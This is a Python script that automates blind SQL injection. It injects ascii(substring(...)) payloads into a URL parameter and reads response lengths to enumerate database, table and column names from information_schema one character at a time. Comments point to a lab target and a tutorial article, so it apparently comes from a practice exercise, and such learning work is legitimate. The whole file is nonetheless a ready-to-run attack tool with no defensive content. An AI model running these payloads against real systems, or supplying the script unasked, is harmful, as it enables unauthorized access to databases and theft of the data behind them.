import argparse
import requests
import string
import logging

# https://defendtheweb.net/article/blind-sql-injection


def main():
    parser = argparse.ArgumentParser(
        prog="blind_sql.py",
        description="Extract database information based on blind SQL injection.",
        usage="python %(prog)s [-u/--url -v/--verbose --current-ddbb -d/--database -t/--table]"
    )
    parser.add_argument("-u", "--url", required=True, type=str, help="Url to SQLi endpoint.")
    parser.add_argument("--current-ddbb", required=False, nargs="?", const=True, default=False, help="Extract name of current database.")
    parser.add_argument("-d", "--database", required=False, help="Extract tables from a given database.")
    parser.add_argument("-t", "--table", required=False, help="Extract columns from a given table.")
    parser.add_argument("-v", "--verbose", required=False, nargs="?", const=True, default=False, help="Set verbose level.")
    _SCRIPT_ARGUMENTS = parser.parse_args()

    obj = blindSQL(url=_SCRIPT_ARGUMENTS.url, verbose=_SCRIPT_ARGUMENTS.verbose)
    if _SCRIPT_ARGUMENTS.current_ddbb:
        obj.get_current_database()
    if _SCRIPT_ARGUMENTS.database and not _SCRIPT_ARGUMENTS.table:
        obj.get_tables_from_database(database_name=_SCRIPT_ARGUMENTS.database)
    elif _SCRIPT_ARGUMENTS.database and _SCRIPT_ARGUMENTS.table:
        obj.get_columns_from_table(database_name=_SCRIPT_ARGUMENTS.database, table_name=_SCRIPT_ARGUMENTS.table)
    else:
        obj.get_databases()


class blindSQL():
    # URL = "http://10.0.2.10/sqli/example4.php?id=2%20and%201=0%20union%20select%20user(),database(),table_name,3,4%20from%20information_schema.tables"
    # http://10.0.2.10/sqli/example4.php?id=2%20and%20substring(database(),1,1)=e
    # r = requests.get(self.url + "%20and%20(select%20length(database()))=" + str(i))
    def __init__(self, url: str, verbose: bool = False):
        self.url = url
        self.verbose = verbose
        self.alphabet_digits = string.ascii_letters + string.digits + "_"  # string.ascii_lowercase
        # get response length for ascci 145 cause database never will be called whith this letter at first
        self.dummy_len = len(requests.get(self.url + "%20and%20ascii(substring((select%20schema_name%20from%20information_schema.schemata%20limit%200,1),1,1))=145").text)
        self.__build_logger()

    def __build_logger(self):
        formatter = logging.Formatter(fmt="%(asctime)s | %(levelname)s | %(name)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
        handler = logging.StreamHandler()
        handler.setFormatter(formatter)
        self.logger = logging.getLogger("blindSQL")
        self.logger.setLevel(logging.DEBUG)
        self.logger.addHandler(handler)

    def get_databases(self):
        count, response_len = 0, 0
        for i in range(1, 11):  # number of bbdd
            URL = self.url + f"%20and%20(select%20count(schema_name)%20from%20information_schema.schemata)={i}"
            try:
                r = requests.get(URL)
                if len(r.text) > response_len:
                    response_len = len(r.text)
                    count = i
                    if self.verbose:
                        self.logger.debug(f"{URL}\nResponse length: {response_len}")
            except Exception as e:
                self.logger.exception("Exception occurred.")
                raise (e)
        self.logger.info(f"Database count: {count}")
        for c in range(0, count):  # number of bbdd (real)
            ddbb_name = ""
            for i in range(1, 21):  # number of caracteres for naming
                response_len = self.dummy_len
                for abc in self.alphabet_digits:
                    # ord() convert to int. See ascii table. Reverse of chr()
                    URL = self.url + f"%20and%20ascii(substring((select%20schema_name%20from%20information_schema.schemata%20limit%20{c},1),{i},1))={ord(abc)}"
                    try:
                        r = requests.get(URL)
                        if len(r.text) > response_len:
                            response_len = len(r.text)
                            ddbb_name = ddbb_name + abc
                        if self.verbose:
                            self.logger.debug(f"{URL}\nResponse length {len(r.text)} with actual {response_len}, trying letter: {abc}, database name: {ddbb_name}")
                    except Exception as e:
                        self.logger.exception("Exception occurred.")
                        raise (e)
            self.logger.info(f"Database name {c+1}: {ddbb_name}")

    def get_current_database(self):
        count, response_len = 0, 0
        for i in range(1, 21):
            try:
                r = requests.get(self.url + f"%20and%20(select%20length(database()))={i}")
                if len(r.text) > response_len:
                    response_len = len(r.text)
                    count = i
            except Exception as e:
                self.logger.exception("Exception occurred.")
                raise (e)
        self.logger.info(f"Actual database count letters: {count}.")
        ddbb_name = ""
        for i in range(1, count+1):
            response_len = self.dummy_len
            for abc in self.alphabet_digits:
                URL = self.url + f"%20and%20ascii(substring(database(),{i},1))={ord(abc)}"
                try:
                    r = requests.get(URL)
                    if len(r.text) > response_len:
                        response_len = len(r.text)
                        ddbb_name = ddbb_name + abc
                    if self.verbose:
                        self.logger.debug(f"{URL}\nResponse length {len(r.text)} with actual {response_len}, trying letter: {abc}, database name: {ddbb_name}")
                except Exception as e:
                    self.logger.exception("Exception occurred.")
                    raise (e)
        self.current_ddbb_name = ddbb_name
        self.logger.info(f"Actual database name: {ddbb_name}")

    def get_tables_from_database(self, database_name: str):
        database_name_hex = "0x" + database_name.encode("utf-8").hex()
        n_tables = 0
        breaker = True
        response_len = self.dummy_len
        while breaker:
            n_tables += 1
            try:
                URL = self.url + f"%20and%20(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema={database_name_hex})={n_tables}"
                r = requests.get(URL)
                if len(r.text) > response_len:
                    response_len = len(r.text)
                    breaker = False
            except Exception as e:
                self.logger.exception("Exception occurred.")
                raise (e)
        self.logger.info(f"Number of tables of the database {database_name}: {n_tables}")
        for c in range(0, n_tables):
            table_name = ""
            for i in range(1, 21):  # number of caracteres for naming
                response_len = self.dummy_len
                for abc in self.alphabet_digits:
                    URL = self.url + f"%20and%20ascii(substring((select%20table_name%20from%20information_schema.tables%20where%20table_schema={database_name_hex}%20limit%20{c},1),{i},1))={ord(abc)}"
                    try:
                        r = requests.get(URL)
                        if len(r.text) > response_len:
                            response_len = len(r.text)
                            table_name = table_name + abc
                            self.logger.info(f"Table name {c+1}: {table_name}")
                        if self.verbose:
                            self.logger.debug(f"{URL}\nResponse length {len(r.text)} with actual {response_len}, trying letter: {abc}, table name: {table_name}")
                    except Exception as e:
                        self.logger.exception("Exception occurred.")
                        raise (e)

    def get_columns_from_table(self, database_name: str, table_name: str):
        database_name_hex = "0x" + database_name.encode("utf-8").hex()
        table_name_hex = "0x" + table_name.encode("utf-8").hex()
        n_columns = 0
        breaker = True
        response_len = self.dummy_len
        while breaker:
            n_columns += 1
            try:
                URL = self.url + f"%20and%20(select%20count(column_name)%20from%20information_schema.columns%20where%20table_schema={database_name_hex}%20and%20table_name={table_name_hex})={n_columns}"
                r = requests.get(URL)
                if len(r.text) > response_len:
                    response_len = len(r.text)
                    breaker = False
            except Exception as e:
                self.logger.exception("Exception occurred.")
                raise (e)
        self.logger.info(f"Number of columns of the table {table_name}: {n_columns}")
        for c in range(0, n_columns):
            column_name = ""
            for i in range(1, 21):  # number of caracteres for naming
                response_len = self.dummy_len
                for abc in self.alphabet_digits:
                    URL = self.url + f"%20and%20ascii(substring((select%20column_name%20from%20information_schema.columns%20where%20(table_schema={database_name_hex}%20and%20table_name={table_name_hex})%20limit%20{c},1),{i},1))={ord(abc)}"
                    try:
                        r = requests.get(URL)
                        if len(r.text) > response_len:
                            response_len = len(r.text)
                            column_name = column_name + abc
                            self.logger.info(f"Column name {c+1}: {column_name}")
                        if self.verbose:
                            self.logger.debug(f"{URL}\nResponse length {len(r.text)} with actual {response_len}, trying letter: {abc}, column name: {column_name}")
                    except Exception as e:
                        self.logger.exception("Exception occurred.")
                        raise (e)


if __name__ == "__main__":
    main()
